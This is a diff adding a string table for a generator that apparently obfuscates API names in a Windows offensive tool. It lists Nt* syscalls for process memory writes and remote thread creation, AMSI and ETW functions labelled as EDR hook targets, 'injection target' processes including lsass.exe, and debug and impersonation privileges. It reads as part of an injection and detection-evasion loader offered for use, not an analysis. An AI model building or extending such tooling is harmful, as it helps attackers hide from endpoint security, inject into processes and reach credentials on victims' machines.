@@ -1,0 +1,45 @@
+# EVS string table — one entry per line: plaintext  identifier_suffix
+# Generated header will have EVS_<identifier_suffix> arrays.
+# Run: python gen_evs.py  (or make)
+
+# DLL names
+ntdll.dll               dll_ntdll
+kernel32.dll            dll_kernel32
+KernelBase.dll          dll_kernelbase
+advapi32.dll            dll_advapi32
+amsi.dll                dll_amsi
+
+# Nt* syscall stubs (ntdll)
+NtOpenProcess               fn_NtOpenProcess
+NtAllocateVirtualMemory     fn_NtAllocateVirtualMemory
+NtWriteVirtualMemory        fn_NtWriteVirtualMemory
+NtProtectVirtualMemory      fn_NtProtectVirtualMemory
+NtFreeVirtualMemory         fn_NtFreeVirtualMemory
+NtCreateThreadEx            fn_NtCreateThreadEx
+NtClose                     fn_NtClose
+NtReadVirtualMemory         fn_NtReadVirtualMemory
+NtContinue                  fn_NtContinue
+NtWaitForSingleObject       fn_NtWaitForSingleObject
+NtProtectVirtualMemory      fn_NtPVM
+
+# ntdll helpers
+RtlCaptureContext           fn_RtlCaptureContext
+RtlUserThreadStart          fn_RtlUserThreadStart
+
+# ETW / AMSI targets (EDR hooks these)
+EtwEventWrite               fn_EtwEventWrite
+EtwTiLogOpenProcess         fn_EtwTiLogOpenProcess
+EtwTiLogReadWriteVm         fn_EtwTiLogReadWriteVm
+EtwTiLogDuplicateHandle     fn_EtwTiLogDuplicateHandle
+AmsiScanBuffer              fn_AmsiScanBuffer
+AmsiScanString              fn_AmsiScanString
+
+# Common process names (injection targets)
+svchost.exe             str_svchost
+explorer.exe            str_explorer
+lsass.exe               str_lsass
+RuntimeBroker.exe       str_RuntimeBroker
+
+# Privilege names
+SeDebugPrivilege        str_SeDebugPrivilege
+SeImpersonatePrivilege  str_SeImpersonatePrivilege
